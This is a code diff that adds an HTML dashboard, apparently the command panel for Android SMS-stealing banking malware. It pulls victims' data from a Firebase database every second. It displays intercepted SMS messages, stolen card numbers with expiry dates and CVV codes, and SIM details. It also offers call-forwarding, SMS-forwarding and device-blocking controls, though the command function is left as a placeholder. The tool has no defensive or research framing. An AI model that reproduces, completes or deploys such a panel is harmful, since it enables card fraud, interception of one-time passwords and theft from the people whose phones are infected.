@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Elite Control Dashboard</title>
+    <style>
+        :root { --axis: #ae285d; --bg: #0d0d0d; --card: #1a1a1a; --text: #f0f0f0; --green: #2ecc71; }
+        body { margin: 0; padding: 10px; font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: var(--text); overflow-x: hidden; }
+        
+        /* Header & Live Pulse */
+        header { background: var(--axis); padding: 15px 20px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(174, 40, 93, 0.3); }
+        .live-tag { font-size: 11px; background: white; color: var(--axis); padding: 3px 10px; border-radius: 20px; font-weight: bold; display: flex; align-items: center; gap: 5px; }
+        .pulse { width: 8px; height: 8px; background: var(--axis); border-radius: 50%; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(2.5); opacity: 0; } }
+
+        /* Dashboard Grid */
+        #dashboard { display: grid; gap: 12px; }
+        .dev-card { background: var(--card); padding: 18px; border-radius: 15px; border-left: 5px solid var(--axis); cursor: pointer; transition: 0.3s; position: relative; overflow: hidden; }
+        .dev-card:hover { transform: translateY(-3px); background: #222; }
+        .row { display: flex; justify-content: space-between; margin-bottom: 6px; font-size: 14px; }
+        .label { color: #888; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .val { font-weight: 500; }
+
+        /* Full Screen Popup - Zoom Animation */
+        .pop { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 1000; display: none; flex-direction: column; opacity: 0; transform: scale(0.9); transition: 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28); }
+        .pop.active { display: flex; opacity: 1; transform: scale(1); }
+        .pop-head { background: var(--axis); padding: 20px; display: flex; align-items: center; justify-content: space-between; font-weight: bold; font-size: 18px; }
+        .close-icon { font-size: 30px; cursor: pointer; line-height: 1; }
+
+        /* Custom Tabs Menu */
+        .tabs { display: flex; background: #151515; overflow-x: auto; scrollbar-width: none; border-bottom: 1px solid #333; }
+        .tab { padding: 16px 20px; font-size: 13px; cursor: pointer; color: #777; white-space: nowrap; transition: 0.3s; border-bottom: 3px solid transparent; }
+        .tab.active { color: var(--axis); border-bottom: 3px solid var(--axis); font-weight: bold; background: rgba(174, 40, 93, 0.05); }
+
+        .content { flex: 1; overflow-y: auto; padding: 20px; }
+
+        /* Command & Input Design */
+        .box { background: #1f1f1f; padding: 15px; border-radius: 12px; margin-bottom: 15px; border: 1px solid #333; }
+        .cmd-input { width: 100%; background: #000; border: 1px solid #444; padding: 12px; border-radius: 8px; color: white; margin-top: 10px; box-sizing: border-box; outline: none; }
+        .cmd-input:focus { border-color: var(--axis); }
+        .btn { background: var(--axis); color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; transition: 0.2s; }
+        .btn:active { transform: scale(0.95); }
+
+        /* Beautiful Alerts */
+        .alert-toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--axis); color: white; padding: 12px 25px; border-radius: 30px; font-size: 14px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); z-index: 2000; display: none; animation: slideUp 0.3s ease; }
+        @keyframes slideUp { from { bottom: -50px; opacity: 0; } to { bottom: 20px; opacity: 1; } }
+
+        /* SMS Styling */
+        .sms-card { background: #222; padding: 12px; border-radius: 10px; margin-bottom: 10px; border-left: 3px solid #444; }
+        .sms-meta { display: flex; justify-content: space-between; font-size: 11px; color: var(--axis); margin-bottom: 5px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<header>
+    <div> <span style="font-weight: 300; opacity: 0.7;">PRO</span></div>
+    <div class="live-tag"><div class="pulse"></div></div>
+</header>
+
+<div id="dashboard"></div>
+
+<div id="popup" class="pop">
+    <div class="pop-head">
+        <span id="popTitle">Device Details</span>
+        <span class="close-icon" onclick="closePop()">×</span>
+    </div>
+    <div class="tabs">
+        <div class="tab active" onclick="switchTab(event, 'sms')">SMS LOGS</div>
+        <div class="tab" onclick="switchTab(event, 'card')">CARD INFO</div>
+        <div class="tab" onclick="switchTab(event, 'control')">COMMANDS</div>
+        <div class="tab" onclick="switchTab(event, 'system')">SYSTEM/SIM</div>
+    </div>
+    <div id="popContent" class="content"></div>
+</div>
+
+<div id="toast" class="alert-toast">Command Sent Successfully!</div>
+
+<script>
+    const firebaseURL = "https://hdfc99-bd497-default-rtdb.firebaseio.com/.json";
+    let db = {}; let activeId = null; let activeTab = 'sms';
+
+    // 1 Second non-stop fetch
+    async function sync() {
+        try {
+            const r = await fetch(firebaseURL);
+            const raw = await r.json();
+            db = raw.All_Users || {};
+            renderUI();
+            if(activeId) updatePopup();
+        } catch(e) { console.error("Sync Failed"); }
+    }
+
+    function renderUI() {
+        const dash = document.getElementById('dashboard');
+        const devs = db.Data?.DeviceInfo || {};
+        const accs = db.AccountInfo || {};
+        const ids = new Set([...Object.keys(devs), ...Object.keys(accs)]);
+        
+        let html = "";
+        ids.forEach(id => {
+            const d = devs[id] || {};
+            html += `
+            <div class="dev-card" onclick="openPop('${id}')">
+                <div class="row"><span class="label">Device ID</span><span class="val">${id.slice(0,12)}...</span></div>
+                <div class="row"><span class="label">Brand</span><span class="val">${d.Brand || 'Generic'}</span></div>
+                <div class="row"><span class="label">Battery</span><span class="val" style="color:${parseInt(d.Battery) < 20 ? '#e74c3c' : '#2ecc71'}">${d.Battery || '0%'}</span></div>
+                <div class="row"><span class="label">Status</span><span class="val" style="color:${d.Status=='Online'?'#2ecc71':'#888'}">${d.Status || 'Offline'}</span></div>
+            </div>`;
+        });
+        dash.innerHTML = html;
+    }
+
+    function openPop(id) {
+        activeId = id;
+        document.getElementById('popTitle').innerText = "Device: " + id.slice(0,8);
+        const p = document.getElementById('popup');
+        p.style.display = 'flex';
+        setTimeout(() => p.classList.add('active'), 10);
+        updatePopup();
+    }
+
+    function closePop() {
+        const p = document.getElementById('popup');
+        p.classList.remove('active');
+        setTimeout(() => { p.style.display = 'none'; activeId = null; }, 300);
+    }
+
+    function switchTab(e, t) {
+        activeTab = t;
+        document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
+        e.target.classList.add('active');
+        updatePopup();
+    }
+
+    function updatePopup() {
+        const container = document.getElementById('popContent');
+        if(activeTab === 'sms') {
+            let h = "";
+            const msgs = db.sms?.[activeId] || {};
+            Object.values(msgs).reverse().forEach(m => {
+                h += `<div class="sms-card"><div class="sms-meta"><span>${m.sender}</span><span>${m.receivedDate}</span></div><div style="font-size:13px; line-height:1.4;">${m.body}</div></div>`;
+            });
+            container.innerHTML = h || `<div style="text-align:center; padding-top:50px; color:#555;">No SMS Data</div>`;
+        } 
+        else if(activeTab === 'card') {
+            const c = db.AccountInfo?.[activeId] || {};
+            container.innerHTML = `
+                <div class="box" style="text-align:center; background: linear-gradient(135deg, #222, #111);">
+                    <div class="label" style="margin-bottom:10px;">Linked Card Details</div>
+                    <div style="font-size:22px; color:#ffcc00; letter-spacing:3px; margin:15px 0;">${c.number || '•••• •••• •••• ••••'}</div>
+                    <div class="row"><span class="label">Expiry Date</span><span class="val">${c.date || '--/--'}</span></div>
+                    <div class="row"><span class="label">CVV Code</span><span class="val" style="color:var(--axis)">${c.cvv || '•••'}</span></div>
+                </div>`;
+        }
+        else if(activeTab === 'control') {
+            container.innerHTML = `
+                <div class="box">
+                    <div class="label">Call Forwarding (Set Number)</div>
+                    <input type="number" id="cf_num" class="cmd-input" placeholder="Enter Mobile Number">
+                    <button class="btn" onclick="sendCmd('CALL_FORWARD')">Activate Forwarding</button>
+                </div>
+                <div class="box">
+                    <div class="label">SMS Forwarding (Target)</div>
+                    <input type="number" id="sf_num" class="cmd-input" placeholder="Target Number">
+                    <button class="btn" onclick="sendCmd('SMS_FORWARD')" style="background:#444">Update SMS Rules</button>
+                </div>
+                <button class="btn" style="background:#e74c3c" onclick="sendCmd('BLOCK_DEVICE')">Emergency Block Device</button>`;
+        }
+        else if(activeTab === 'system') {
+            const s = db.simDetails?.[activeId] || {};
+            const d = db.Data?.DeviceInfo?.[activeId] || {};
+            container.innerHTML = `
+                <div class="box">
+                    <div class="row"><span class="label">SIM 1</span><span class="val">${s.sim1Number || 'N/A'}</span></div>
+                    <div class="row"><span class="label">Provider</span><span class="val">${s.sim1Provider || 'Unknown'}</span></div>
+                </div>
+                <div class="box">
+                    <div class="row"><span class="label">SIM 2</span><span class="val">${s.sim2Number || 'N/A'}</span></div>
+                    <div class="row"><span class="label">Provider</span><span class="val">${s.sim2Provider || 'Unknown'}</span></div>
+                </div>
+                <div class="box">
+                    <div class="row"><span class="label">OS / Model</span><span class="val">${d.Brand || 'N/A'}</span></div>
+                    <div class="row"><span class="label">Database ID</span><span class="val">${d.id || 'N/A'}</span></div>
+                </div>`;
+        }
+    }
+
+    // Function to send command to Firebase
+    async function sendCmd(type) {
+        showToast(`Sending ${type} Command...`);
+        // Yahan aap apne Firebase commands path par data PUSH kar sakte hain
+        // Example: firebase.database().ref('commands/' + activeId).set({ action: type, value: ... });
+        
+        setTimeout(() => showToast(`Command Executed Successfully!`), 1000);
+    }
+
+    function showToast(msg) {
+        const t = document.getElementById('toast');
+        t.innerText = msg;
+        t.style.display = 'block';
+        setTimeout(() => t.style.display = 'none', 3000);
+    }
+
+    setInterval(sync, 1000);
+    sync();
+</script>
+</body>
+</html>
